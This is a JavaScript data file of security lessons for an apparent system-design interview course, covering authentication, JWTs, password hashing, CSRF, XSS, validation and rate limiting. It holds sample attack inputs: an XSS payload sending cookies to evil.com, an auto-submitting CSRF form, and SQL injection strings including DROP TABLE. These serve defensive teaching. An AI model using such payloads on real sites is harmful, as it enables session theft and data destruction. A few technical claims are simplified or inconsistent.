/* Part 3 — Security (9 topics) — Deep Rewrite */
const PART3 = {
  id: "part3",
  icon: "🔒",
  title: "Part 3",
  name: "Security & Auth",
  topics: [
    {
      id: "p3t1",
      title: "Authentication vs Authorization",
      subtitle:
        "Two separate questions every system must answer: Who are you? What can you do?",
      sections: [
        {
          icon: "📖",
          color: "si-blue",
          title: "Simple Definition",
          body: `<p><strong>Authentication</strong> (AuthN) answers: <em>"Who are you?"</em> It verifies identity — confirming that Rahul is who he claims to be, usually via password, OTP, or token. <strong>Authorization</strong> (AuthZ) answers: <em>"What are you allowed to do?"</em> It enforces permissions — confirming that Rahul can see his own orders but not other users' orders.</p>
<p>Authentication always comes first. You must know who someone is before deciding what they can do. Confusing these two concepts leads to serious security bugs.</p>`,
        },
        {
          icon: "🔍",
          color: "si-purple",
          title: "Why They Are Separate Concerns",
          body: `<p>A successfully authenticated user is not automatically authorised to do everything. Rahul logs into ShopKart (authenticated). He should be able to view his own order history (authorised). He should NOT be able to view another user's order history, issue a refund (admin action), or edit a product listing (seller action). Authentication opens the door; authorization controls every room inside.</p>
<p>These are also implemented by different systems. Authentication might use OAuth2 + JWT. Authorization might use Role-Based Access Control (RBAC), Attribute-Based Access Control (ABAC), or a policy engine like OPA (Open Policy Agent) for complex rules.</p>`,
        },
        {
          icon: "🏪",
          color: "si-green",
          title: "ShopKart Access Control",
          body: `<div class="diagram-box">ShopKart Roles:
  CUSTOMER  → can: view own orders, view products, checkout
  SELLER    → can: manage own product listings, view own store orders
  ADMIN     → can: view all orders, issue refunds, manage all products

Authentication: JWT token contains userId + roles:
  { "sub": "42", "roles": ["CUSTOMER"], "email": "rahul@example.com" }

Authorization Checks:
  GET /orders/789:
    ✅ Is request authenticated? Token valid? (AuthN)
    ✅ Does order 789 belong to userId 42? (AuthZ — ownership check)
    ✅ If admin, skip ownership check
    
  PATCH /products/123 (edit product):
    ✅ Is request authenticated? (AuthN)
    ✅ Does user have SELLER or ADMIN role? (AuthZ — role check)
    ✅ If SELLER, does product 123 belong to their store? (AuthZ — ownership)

Common Bug (AuthN without AuthZ):
  GET /orders/789 → only checks token is valid, not ownership
  Rahul changes URL to /orders/790 → sees another user's order ← IDOR bug!</div>`,
        },
        {
          icon: "⚠️",
          color: "si-red",
          title: "IDOR — The Most Common AuthZ Bug",
          body: `<div class="callout danger"><span class="callout-icon">🚨</span><strong>IDOR (Insecure Direct Object Reference)</strong> is the most common authorization vulnerability in web apps. It happens when an API authenticates the user but doesn't check if they own the resource. Always verify: "Does this authenticated user have the right to access THIS specific resource?" Never assume sequential IDs are private — use UUIDs and enforce ownership checks.</div>`,
        },
        {
          icon: "🎯",
          color: "si-orange",
          title: "Interview Insight",
          body: `<div class="interview-card"><div class="interview-label">AuthN vs AuthZ</div><div class="interview-q">Always distinguish authentication and authorization in system design. "Users authenticate with JWT tokens. Authorization uses RBAC — each endpoint checks the required role, and resource-scoped endpoints additionally verify the user owns the specific resource (order, address, review) they're trying to access." This two-layer authorization model is what senior engineers implement.</div></div>`,
        },
      ],
    },

    {
      id: "p3t2",
      title: "Session-Based Authentication",
      subtitle:
        "The classic stateful auth model — server remembers who you are.",
      sections: [
        {
          icon: "📖",
          color: "si-blue",
          title: "Simple Definition",
          body: `<p>In <strong>session-based auth</strong>, after login the server creates a session object (containing user data, permissions, expiry) and stores it server-side (in Redis or a DB). The client receives only a <strong>session ID</strong> — a random opaque string. On every subsequent request, the client sends this session ID (via cookie or header), and the server looks it up in the session store to retrieve the user's context.</p>`,
        },
        {
          icon: "🔷",
          color: "si-cyan",
          title: "Step-by-Step Flow",
          body: `<div class="step-list">
  <div class="step-item"><div class="step-num">1</div><div class="step-text">Rahul POSTs /auth/login with email + password.</div></div>
  <div class="step-item"><div class="step-num">2</div><div class="step-text">Server verifies credentials (bcrypt compare). On success, generates a cryptographically random session ID: <code>sess_a3f2b1c4d5e6f7g8</code></div></div>
  <div class="step-item"><div class="step-num">3</div><div class="step-text">Server stores in Redis: <code>session:sess_a3f2b1c4d5e6f7g8 → {userId: 42, roles: ["CUSTOMER"], loginAt: "...", expiresAt: "..."}</code> with 24h TTL.</div></div>
  <div class="step-item"><div class="step-num">4</div><div class="step-text">Server sends response with <code>Set-Cookie: sessionId=sess_a3f2b1c4d5e6f7g8; HttpOnly; Secure; SameSite=Strict</code></div></div>
  <div class="step-item"><div class="step-num">5</div><div class="step-text">Every subsequent request: browser auto-sends cookie. Server reads sessionId, looks up Redis → gets user context. Request processed.</div></div>
  <div class="step-item"><div class="step-num">6</div><div class="step-text">Logout: DELETE session from Redis → session ID is now worthless. Instant revocation.</div></div>
</div>`,
        },
        {
          icon: "🔷",
          color: "si-purple",
          title: "Sessions vs JWTs Comparison",
          body: `<table class="compare-table"><thead><tr><th></th><th>Sessions (Redis)</th><th>JWT Tokens</th></tr></thead><tbody>
<tr><td><strong>Storage</strong></td><td>Server (Redis)</td><td>Client (localStorage, cookie)</td></tr>
<tr><td><strong>Revocation</strong></td><td>Instant — delete from Redis</td><td>Hard — must wait for expiry or maintain blocklist</td></tr>
<tr><td><strong>Scalability</strong></td><td>Requires shared Redis (no problem in practice)</td><td>Stateless — any server can verify</td></tr>
<tr><td><strong>Size overhead</strong></td><td>Tiny cookie (20 bytes)</td><td>Larger token (200-1000 bytes)</td></tr>
<tr><td><strong>Best for</strong></td><td>User-facing web apps, when revocation matters</td><td>Microservices auth, mobile apps, third-party API access</td></tr>
</tbody></table>`,
        },
        {
          icon: "🧠",
          color: "si-yellow",
          title: "Architect Thinking",
          body: `<p>Session-based auth is often undervalued. For ShopKart's main web application, sessions are excellent: instant logout (delete from Redis), easy to revoke all sessions if account is compromised, small cookie size. The "sessions don't scale" myth is outdated — Redis handles millions of session lookups per second with sub-millisecond latency. The trade-off is requiring a Redis lookup on every request (vs JWT which is self-contained). At ShopKart's scale, that Redis lookup is ~0.3ms — negligible.</p>`,
        },
      ],
    },

    {
      id: "p3t3",
      title: "JWT (JSON Web Tokens)",
      subtitle:
        "Self-contained cryptographic tokens that carry identity without a database lookup.",
      sections: [
        {
          icon: "📖",
          color: "si-blue",
          title: "Simple Definition",
          body: `<p>A <strong>JWT</strong> (JSON Web Token) is a self-contained token that encodes user information (claims) and is cryptographically signed. Any server with the signing key can verify the token's authenticity without a database lookup. JWTs are stateless — the token IS the session.</p>`,
        },
        {
          icon: "🔍",
          color: "si-purple",
          title: "JWT Structure",
          body: `<div class="diagram-box">JWT consists of three base64url-encoded parts joined by dots:
  header.payload.signature

Header:  {"alg": "HS256", "typ": "JWT"}
  → base64url → eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

Payload (claims — VISIBLE, NOT encrypted!):
  {
    "sub": "42",                    ← subject (user ID)
    "email": "rahul@example.com",
    "roles": ["CUSTOMER"],
    "iat": 1741420800,              ← issued at (unix timestamp)
    "exp": 1741507200               ← expires at (24h later)
  }
  → base64url → eyJzdWIiOiI0MiIsInJvbGVzIjp...

Signature: HMACSHA256(header + "." + payload, SECRET_KEY)
  → ensures no one tampered with the payload

Full token: eyJhbGc...eyJzdWI...signature

⚠️ CRITICAL: JWT payload is ENCODED, not ENCRYPTED.
Anyone can decode it. Never put passwords or sensitive data in JWT.
The signature only proves it hasn't been tampered with.</div>`,
        },
        {
          icon: "🏪",
          color: "si-green",
          title: "ShopKart JWT Flow",
          body: `<div class="step-list">
  <div class="step-item"><div class="step-num">1</div><div class="step-text">Rahul logs in → server creates JWT signed with RS256 (private key). Returns token to client.</div></div>
  <div class="step-item"><div class="step-num">2</div><div class="step-text">Client stores JWT in secure HttpOnly cookie (not localStorage — XSS risk).</div></div>
  <div class="step-item"><div class="step-num">3</div><div class="step-text">Every API request: client sends JWT in Authorization header: <code>Authorization: Bearer eyJhbGc...</code></div></div>
  <div class="step-item"><div class="step-num">4</div><div class="step-text">Each microservice (Order Service, Payment Service) independently verifies the JWT using the public key. No Redis lookup needed. No central auth server needed for every request.</div></div>
  <div class="step-item"><div class="step-num">5</div><div class="step-text">Token expires (exp claim). Client must re-authenticate or use refresh token.</div></div>
</div>`,
        },
        {
          icon: "⚠️",
          color: "si-red",
          title: "Critical JWT Vulnerabilities",
          body: `<div class="key-list">
  <div class="key-item"><div class="key-bullet">❌</div><div><strong>alg=none attack.</strong> Old libraries accepted tokens with "alg": "none" — no signature required. Always explicitly specify and enforce the allowed algorithm. Never trust the algorithm from the token header.</div></div>
  <div class="key-item"><div class="key-bullet">❌</div><div><strong>Storing JWT in localStorage.</strong> XSS attack can read localStorage with one line of JavaScript. Use HttpOnly cookies — JavaScript cannot read them.</div></div>
  <div class="key-item"><div class="key-bullet">❌</div><div><strong>Long expiry without refresh tokens.</strong> A 30-day JWT cannot be revoked if the user logs out or account is compromised. Use short expiry (15 minutes) + refresh tokens.</div></div>
  <div class="key-item"><div class="key-bullet">❌</div><div><strong>Weak secret key.</strong> HMAC-SHA256 with a short or guessable secret can be brute-forced offline. Use RS256 (asymmetric) for production or a 256-bit+ random secret for HS256.</div></div>
</div>`,
        },
        {
          icon: "🎯",
          color: "si-orange",
          title: "Interview Insight",
          body: `<div class="interview-card"><div class="interview-label">JWT Best Practices</div><div class="interview-q">When choosing JWT vs sessions: "For microservices, JWTs enable stateless verification — each service validates the token without calling a central auth service. We use RS256 so each service only needs the public key. Access tokens expire in 15 minutes; refresh tokens (stored in HttpOnly cookie) are valid 7 days and are stored in Redis for instant revocation." This covers both the why and the security considerations.</div></div>`,
        },
      ],
    },

    {
      id: "p3t4",
      title: "Access Tokens & Refresh Tokens",
      subtitle:
        "Short-lived security with seamless user experience — the best of both worlds.",
      sections: [
        {
          icon: "📖",
          color: "si-blue",
          title: "Simple Definition",
          body: `<p>An <strong>access token</strong> is a short-lived JWT (typically 15 minutes) used to authenticate API requests. A <strong>refresh token</strong> is a long-lived opaque token (typically 7–30 days) used solely to obtain new access tokens when the old one expires. This two-token system balances security (short-lived access tokens) with user experience (no frequent logins).</p>`,
        },
        {
          icon: "🔷",
          color: "si-cyan",
          title: "Two-Token Flow",
          body: `<div class="diagram-box">Login:
  POST /auth/login → email + password
  Response:
    access_token: eyJhbGc...  (JWT, expires in 15 min) → stored in memory
    refresh_token: rt_a3f2b1c4...  (opaque, 7 days)   → stored in HttpOnly cookie

Normal API calls (next 15 minutes):
  GET /orders → Authorization: Bearer {access_token} ✅

After 15 minutes, access token expires:
  GET /orders → 401 Unauthorized (token expired)
  
Automatic token refresh (silent, user doesn't notice):
  POST /auth/refresh → refresh_token (from HttpOnly cookie)
  Server checks: Is this refresh token in Redis? Not revoked?
  If valid → issues new access_token (new 15 min JWT)
  Retry original request → ✅

Logout:
  POST /auth/logout → server deletes refresh_token from Redis
  Both tokens now useless (access token expires naturally in ≤15 min)

Security benefit:
  If access token is stolen → attacker can use it for max 15 minutes
  Then it's worthless (can't refresh — they don't have the refresh token cookie)</div>`,
        },
        {
          icon: "🧠",
          color: "si-yellow",
          title: "Architect Thinking — Token Storage",
          body: `<p>Where to store tokens is a security-usability trade-off:</p>
<ul>
  <li><strong>Access token in memory</strong> (JavaScript variable): Lost on page refresh, invisible to XSS, but doesn't survive navigation. Best security for SPA applications.</li>
  <li><strong>Refresh token in HttpOnly cookie</strong>: Invisible to JavaScript (XSS proof). Automatically sent by browser. Protected from CSRF with SameSite=Strict. This is the recommended production pattern.</li>
  <li><strong>Never store tokens in localStorage</strong>: Any XSS vulnerability (injected script, compromised npm package) can steal ALL localStorage tokens. A single XSS attack persists across sessions — attacker retains access until user manually revokes.</li>
</ul>`,
        },
      ],
    },

    {
      id: "p3t5",
      title: "Password Hashing",
      subtitle:
        "Storing passwords so that even if your database is stolen, passwords remain secret.",
      sections: [
        {
          icon: "📖",
          color: "si-blue",
          title: "Simple Definition",
          body: `<p><strong>Password hashing</strong> is a one-way transformation of a password into a fixed-length string (hash). The original password cannot be recovered from the hash. When Rahul logs in, ShopKart hashes his input and compares it to the stored hash — the actual password is never stored anywhere. If ShopKart's database is stolen, attackers get hashes, not passwords.</p>`,
        },
        {
          icon: "🔍",
          color: "si-purple",
          title: "Why Simple Hashing is Not Enough",
          body: `<div class="diagram-box">❌ WRONG — Plain hash (MD5, SHA-1, SHA-256):
  password: "shopkart123"
  SHA-256:  "2c624232cdd221771294dfbb310aca000a0df6ac..."
  
  Problem 1 — Rainbow Tables:
  Attacker pre-computes hashes for ALL common passwords.
  "shopkart123" is common → they already have its SHA-256 hash.
  Instant crack without brute force.
  
  Problem 2 — Speed:
  SHA-256 computes 1 billion hashes/second on modern GPU.
  Brute force all 8-char passwords: minutes.
  
✅ CORRECT — Adaptive hashing with salt (bcrypt, Argon2, scrypt):
  password: "shopkart123"
  + random salt: "x9f2b3c4d5e6f7g8" (stored with hash)
  bcrypt(password + salt, cost=12)
  = "$2b$12$x9f2b3c4d5e6f7g8MK8..."
  
  bcrypt at cost=12: 250ms per hash → 4 hashes/second
  GPU brute force: still only 4 hashes/second (bcrypt is intentionally slow)
  Rainbow tables: useless (unique salt per user)</div>`,
        },
        {
          icon: "🏪",
          color: "si-green",
          title: "ShopKart Password Implementation",
          body: `<div class="diagram-box">Registration:
  Rahul sets password: "mySecurePass123!"
  
  1. Generate random 16-byte salt: crypto.randomBytes(16)
  2. bcrypt.hash(password, 12) → bcrypt internally handles salt
  3. Store ONLY the hash: "$2b$12$KixKGbGGstZmC4YG..."
  4. Never store the plaintext password. Never.

Login Verification:
  Rahul enters: "mySecurePass123!"
  1. Fetch stored hash from DB for rahul@example.com
  2. bcrypt.compare("mySecurePass123!", storedHash) → true/false
  3. Returns boolean — doesn't reveal the original password

Password Reset (critical — do NOT email passwords):
  1. Generate a cryptographically random reset token (UUID v4)
  2. Store hash of reset token + expiry (15 min) in DB
  3. Email the TOKEN (not the hash) as URL: /reset?token=...
  4. On reset page: verify token hash, accept new password, hash it, delete token</div>`,
        },
        {
          icon: "⚠️",
          color: "si-red",
          title: "Critical Mistakes",
          body: `<div class="key-list">
  <div class="key-item"><div class="key-bullet">❌</div><div><strong>MD5 or SHA-1 for passwords.</strong> These are fast hashing algorithms designed for checksums, not password storage. Both are completely broken for password use in milliseconds.</div></div>
  <div class="key-item"><div class="key-bullet">❌</div><div><strong>Storing plaintext passwords anywhere.</strong> Not in DB, not in logs, not in emails. Ever. When a user resets their password, email a reset link — never their current or new password.</div></div>
  <div class="key-item"><div class="key-bullet">❌</div><div><strong>Using SHA-256 without salt.</strong> Identical passwords produce identical hashes — one cracked hash cracks all users with the same password.</div></div>
</div>`,
        },
        {
          icon: "🎯",
          color: "si-orange",
          title: "Interview Insight",
          body: `<div class="interview-card"><div class="interview-label">Password Security</div><div class="interview-q">Always specify bcrypt or Argon2 (never MD5/SHA for passwords) when asked about user authentication. "We hash passwords with bcrypt at cost factor 12 — intentionally slow at 250ms per hash, which prevents brute force. Salts are auto-generated per user by bcrypt, preventing rainbow table attacks." This level of specificity shows real security knowledge.</div></div>`,
        },
      ],
    },

    {
      id: "p3t6",
      title: "CSRF Attacks",
      subtitle:
        "Protecting users from being tricked into performing actions they didn't intend.",
      sections: [
        {
          icon: "📖",
          color: "si-blue",
          title: "Simple Definition",
          body: `<p><strong>CSRF</strong> (Cross-Site Request Forgery) is an attack where a malicious website tricks Rahul's browser into making an authenticated request to ShopKart using his real cookies. Since the browser automatically includes cookies, ShopKart can't distinguish Rahul's genuine request from a forged one originating from evil-site.com.</p>`,
        },
        {
          icon: "🔍",
          color: "si-purple",
          title: "The Attack",
          body: `<div class="diagram-box">Attack Scenario:
  1. Rahul is logged into shopkart.com (session cookie in browser)
  2. Rahul visits evil-site.com (maybe clicked an email link)
  3. evil-site.com's HTML contains hidden form:
     &lt;form action="https://shopkart.com/orders" method="POST"&gt;
       &lt;input name="product_id" value="999" /&gt;
       &lt;input name="quantity" value="100" /&gt;
     &lt;/form&gt;
     &lt;script&gt;document.forms[0].submit()&lt;/script&gt;
  4. Browser submits form TO shopkart.com including Rahul's session cookie
  5. ShopKart sees valid authenticated request → places order!
  
Rahul unknowingly bought 100 units of product 999.
This is CSRF. The browser is weaponised using its own cookie behaviour.</div>`,
        },
        {
          icon: "🏪",
          color: "si-green",
          title: "CSRF Defences",
          body: `<div class="key-list">
  <div class="key-item"><div class="key-bullet">✅</div><div><strong>SameSite Cookie (Best Defence):</strong> Set <code>SameSite=Strict</code> or <code>SameSite=Lax</code> on session cookies. Browser will NOT send the cookie when the request originates from a different site. Supported in all modern browsers. This single flag defeats most CSRF attacks.</div></div>
  <div class="key-item"><div class="key-bullet">✅</div><div><strong>CSRF Token:</strong> Server generates a random token per session, embeds it in every form. Server validates this token on every state-changing request. Evil-site.com cannot read this token (same-origin policy), so forged forms lack the valid token.</div></div>
  <div class="key-item"><div class="key-bullet">✅</div><div><strong>Origin/Referer Validation:</strong> Check that the request Origin or Referer header matches your domain. Forged cross-origin requests will show evil-site.com as the Origin.</div></div>
  <div class="key-item"><div class="key-bullet">✅</div><div><strong>JSON APIs with custom headers:</strong> Require <code>Content-Type: application/json</code> and <code>X-Requested-With: XMLHttpRequest</code>. HTML forms cannot set custom headers — this separates Ajax requests from form submissions.</div></div>
</div>`,
        },
        {
          icon: "🎯",
          color: "si-orange",
          title: "Interview Insight",
          body: `<div class="interview-card"><div class="interview-label">Modern CSRF Defence</div><div class="interview-q">For modern SPAs using JWT in headers (not cookies), CSRF is not a threat — CSRF relies on cookies being auto-sent, and headers are not auto-sent cross-origin. For cookie-based auth, <code>SameSite=Strict</code> is now the primary defence. CSRF tokens are still used for defence-in-depth on critical forms like payments.</div></div>`,
        },
      ],
    },

    {
      id: "p3t7",
      title: "XSS (Cross-Site Scripting)",
      subtitle: "Injecting malicious scripts into pages that other users view.",
      sections: [
        {
          icon: "📖",
          color: "si-blue",
          title: "Simple Definition",
          body: `<p><strong>XSS</strong> (Cross-Site Scripting) is an attack where malicious JavaScript is injected into web pages and executed in other users' browsers. The attacker's script runs in the context of ShopKart.com — with access to everything your JavaScript can access: DOM, localStorage, cookies (if not HttpOnly), and the ability to make API calls as the user.</p>`,
        },
        {
          icon: "🔍",
          color: "si-purple",
          title: "Types of XSS",
          body: `<div class="info-grid">
  <div class="info-card red"><div class="info-card-title">Stored XSS (Persistent)</div><p>Attacker submits malicious script as a product review: <code>&lt;script&gt;fetch('evil.com/?c='+document.cookie)&lt;/script&gt;</code>. ShopKart stores it in DB and renders it on the product page. Every user viewing that product runs the attacker's code.</p></div>
  <div class="info-card yellow"><div class="info-card-title">Reflected XSS</div><p>Malicious script is in the URL: <code>shopkart.com/search?q=&lt;script&gt;...&lt;/script&gt;</code>. If ShopKart renders the search query without escaping, the script runs. Attack delivered via phishing link.</p></div>
  <div class="info-card blue"><div class="info-card-title">DOM-Based XSS</div><p>No server involved — JavaScript reads from URL hash/params and renders to DOM without sanitisation. Entirely client-side vulnerability.</p></div>
</div>`,
        },
        {
          icon: "🏪",
          color: "si-green",
          title: "ShopKart XSS Defences",
          body: `<div class="key-list">
  <div class="key-item"><div class="key-bullet">✅</div><div><strong>Output Encoding (Primary Defence):</strong> Encode all user-supplied data before rendering in HTML. <code>&lt;</code> becomes <code>&amp;lt;</code>. React and modern frameworks do this automatically for JSX expressions. Never use <code>innerHTML</code> or <code>dangerouslySetInnerHTML</code> with user input.</div></div>
  <div class="key-item"><div class="key-bullet">✅</div><div><strong>Content Security Policy (CSP):</strong> HTTP header that tells the browser which scripts are allowed to execute. <code>Content-Security-Policy: default-src 'self'</code> blocks all scripts not from your own domain — even successfully injected scripts won't execute.</div></div>
  <div class="key-item"><div class="key-bullet">✅</div><div><strong>HttpOnly cookies:</strong> Session tokens in HttpOnly cookies cannot be accessed by <code>document.cookie</code> — the most common XSS goal (steal session tokens) is defeated.</div></div>
  <div class="key-item"><div class="key-bullet">✅</div><div><strong>Input Sanitisation on server:</strong> Reject malformed input early. Validate and sanitise HTML (if you allow rich text) using a library like DOMPurify.</div></div>
</div>`,
        },
        {
          icon: "🎯",
          color: "si-orange",
          title: "Interview Insight",
          body: `<div class="interview-card"><div class="interview-label">XSS vs CSRF</div><div class="interview-q">Common interview question: "What's the difference between XSS and CSRF?" XSS: attacker injects code that runs in the victim's browser (attacker code, victim's context). CSRF: attacker tricks the victim's browser into sending requests using the victim's credentials (victim's browser, victim's credentials, attacker's intent). XSS is generally more dangerous — it can steal credentials, tokens, perform actions, and spread virally.</div></div>`,
        },
      ],
    },

    {
      id: "p3t8",
      title: "Input Validation & Sanitisation",
      subtitle:
        "Trust nothing from the client — validate and sanitise all input at the boundary.",
      sections: [
        {
          icon: "📖",
          color: "si-blue",
          title: "Simple Definition",
          body: `<p><strong>Input validation</strong> verifies that incoming data matches the expected format, type, range, and constraints (e.g., "this must be a positive integer less than 1000"). <strong>Sanitisation</strong> cleans potentially dangerous input (e.g., stripping HTML tags from a name field). Together they protect against injection attacks, data corruption, and application crashes.</p>`,
        },
        {
          icon: "🔍",
          color: "si-purple",
          title: "Why Client-Side Validation is Never Enough",
          body: `<p>ShopKart's checkout form validates quantity (must be 1-10) in JavaScript. A user opens browser DevTools and sends <code>POST /orders</code> with <code>quantity: -9999</code> directly. Without server-side validation, ShopKart creates an order for negative quantity — corrupting inventory, potentially refunding money without a purchase, or crashing with arithmetic errors. <strong>Client-side validation is UX. Server-side validation is security.</strong></p>`,
        },
        {
          icon: "🏪",
          color: "si-green",
          title: "ShopKart Validation Schema",
          body: `<div class="diagram-box">POST /orders — Request Validation (Zod / Joi schema):

{
  items: Array({
    product_id: integer, min: 1           ← must be positive integer
    quantity: integer, min: 1, max: 100   ← business rule: max 100 units
  }), min: 1, max: 50                     ← max 50 distinct items per order

  shipping_address: {
    name:    string, min: 2, max: 100     ← required, length bounds
    street:  string, min: 5, max: 200
    city:    string, min: 2, max: 100
    pincode: string, regex: /^\d{6}$/     ← exactly 6 digits
    state:   enum: [valid Indian state names]
    phone:   string, regex: /^[6-9]\d{9}$/ ← Indian mobile format
  }

  payment_method: enum: ["UPI", "CARD", "COD", "WALLET"]
  coupon_code: string, optional, max: 20, regex: /^[A-Z0-9-]+$/
}

Validation Failures → 422 with field-level errors:
  { "field": "items[0].quantity", "code": "MAX_EXCEEDED", "max": 100 }
  { "field": "shipping_address.pincode", "code": "INVALID_FORMAT" }</div>`,
        },
        {
          icon: "⚠️",
          color: "si-red",
          title: "SQL Injection — Validate Your Queries",
          body: `<div class="callout danger"><span class="callout-icon">🚨</span><strong>Never interpolate user input into SQL strings.</strong><br>
BAD: <code>db.query("SELECT * FROM products WHERE name = '" + userInput + "'")</code><br>
If userInput = <code>Nike' OR '1'='1</code> → returns ALL products.<br>
If userInput = <code>Nike'; DROP TABLE products; --</code> → destroys your database.<br><br>
ALWAYS: <code>db.query("SELECT * FROM products WHERE name = $1", [userInput])</code><br>
Parameterised queries send value as data, never as SQL syntax. No exceptions.</div>`,
        },
      ],
    },

    {
      id: "p3t9",
      title: "Rate Limiting",
      subtitle:
        "Protecting your API from abuse, DoS attacks, and runaway clients.",
      sections: [
        {
          icon: "📖",
          color: "si-blue",
          title: "Simple Definition",
          body: `<p><strong>Rate limiting</strong> restricts how many requests a client (identified by IP address, user ID, or API key) can make within a time window. It protects APIs from abuse (bots scraping your product catalog), prevents DoS attacks (a single client consuming all capacity), and enforces fair use policies for multi-tenant APIs.</p>`,
        },
        {
          icon: "🔍",
          color: "si-purple",
          title: "Rate Limiting Algorithms",
          body: `<table class="compare-table"><thead><tr><th>Algorithm</th><th>How It Works</th><th>Pros</th><th>Cons</th></tr></thead><tbody>
<tr><td><strong>Fixed Window</strong></td><td>Count requests per minute. Reset at minute boundary.</td><td>Simple</td><td>Burst at window boundary: 200 req in 2 seconds straddling the window</td></tr>
<tr><td><strong>Sliding Window</strong></td><td>Count requests in the last N seconds relative to now</td><td>Smoother, no boundary burst</td><td>Slightly more complex (stored as timestamp list)</td></tr>
<tr><td><strong>Token Bucket</strong></td><td>Bucket fills at constant rate. Each request consumes one token. Burst up to bucket size.</td><td>Allows controlled bursting. Most flexible.</td><td>More state to maintain</td></tr>
<tr><td><strong>Leaky Bucket</strong></td><td>Requests queued; processed at fixed rate. Excess dropped.</td><td>Perfectly smooth output</td><td>Adds latency. Not suited for APIs (use for traffic shaping).</td></tr>
</tbody></table>`,
        },
        {
          icon: "🏪",
          color: "si-green",
          title: "ShopKart Rate Limit Design",
          body: `<div class="diagram-box">ShopKart Rate Limits (implemented via Redis + API Gateway):

Public APIs (unauthenticated, by IP):
  GET /products      → 100 req/min per IP
  GET /search        → 30 req/min per IP (expensive query)

Authenticated APIs (by user ID):
  General endpoints  → 600 req/min per user
  POST /orders       → 10 req/hour per user (prevent order spam)
  POST /reviews      → 5 per product per day per user

API Key (third-party sellers):
  Seller API         → 1000 req/min per API key (paid tier)
  Seller API         → 100 req/min per API key  (free tier)

Headers returned with every response:
  X-RateLimit-Limit:     100       ← total limit
  X-RateLimit-Remaining: 73        ← requests left in window
  X-RateLimit-Reset:     1741421460 ← unix timestamp when window resets

On limit exceeded:
  HTTP 429 Too Many Requests
  Retry-After: 23                  ← seconds until limit resets
  {"error": {"code": "RATE_LIMIT_EXCEEDED", "message": "..."}}</div>`,
        },
        {
          icon: "🧠",
          color: "si-yellow",
          title: "Architect Thinking",
          body: `<p>Rate limiting should be implemented at multiple layers: <strong>API Gateway or CDN layer</strong> (CloudFront/Kong) for coarse protection against DDoS before traffic hits your servers, <strong>application layer</strong> for fine-grained per-user business rules, and <strong>database layer</strong> (connection limits) for resource exhaustion protection. Redis with the <code>INCR</code> command and key expiry is the standard implementation — fast (microseconds), atomic, and distributed (all app servers share the same Redis counter). Token bucket is the recommended algorithm for most APIs because it allows short bursts (user uploaded 5 images in quick succession) while preventing sustained abuse.</p>`,
        },
        {
          icon: "🎯",
          color: "si-orange",
          title: "Interview Insight",
          body: `<div class="interview-card"><div class="interview-label">Rate Limiting Design</div><div class="interview-q">When asked to design rate limiting: "Redis-based token bucket per user ID. Each user gets a bucket of 100 tokens. Tokens replenish at 1/second. Each API request consumes 1 token. On empty bucket → 429 with Retry-After header. Redis EVAL script ensures atomic check-and-decrement. Rate limits are enforced at the API gateway so app servers are protected even from clients that bypass the gateway." Cover the algorithm, the storage mechanism, and the response handling.</div></div>`,
        },
      ],
    },
  ],
};
